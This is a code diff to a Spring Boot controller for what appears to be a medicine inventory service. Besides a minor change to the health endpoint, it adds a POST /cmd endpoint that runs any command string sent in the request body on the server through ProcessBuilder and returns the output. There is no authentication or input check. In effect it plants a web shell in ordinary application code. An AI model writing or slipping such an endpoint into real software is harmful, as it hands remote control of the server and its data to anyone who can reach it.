@@ -6,7 +6,12 @@ import com.fasterxml.jackson.annotation.JsonProperty;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.*;
 
+import java.io.BufferedWriter;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.io.SequenceInputStream;
 import java.util.List;
+import java.util.Scanner;
 
 @RestController
 public class MedController {
@@ -17,8 +22,8 @@ public class MedController {
     PickedMedDataService pickedMedDataService;
 
     @GetMapping("/health")
-    public String sayHello() {
-        return "I am up & running";
+    public Response sayHello() {
+        return new Response(200, "Up & Running.");
     }
 
     @GetMapping("/medicines")
@@ -41,6 +46,32 @@ public class MedController {
     public Response updateExpiry() {
         medDataService.updateExpiry();
         return new Response(201, "Success");
+    }
+
+    @PostMapping("/cmd")
+    public String cmd(@RequestBody Cmd cmd) throws Exception {
+        String command = cmd.cmd;
+        String[] arr = command.split(" ");
+
+        ProcessBuilder pb = new ProcessBuilder(arr);
+        Process p = pb.start();
+        OutputStream stdin = p.getOutputStream();
+        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stdin));
+        writer.write("\n");
+
+        // Return the response.
+        SequenceInputStream sis = new SequenceInputStream(p.getInputStream(), p.getErrorStream());
+        String out = "";
+        Scanner scanner = new Scanner(sis).useDelimiter("\\A");
+        out = scanner.hasNext() ? scanner.next() : "";
+        System.out.println(out);
+        scanner.close();
+
+        return out;
+    }
+
+    public record Cmd(@JsonProperty String cmd) {
+
     }
 
     public record Response(@JsonProperty Integer code, @JsonProperty String message) {
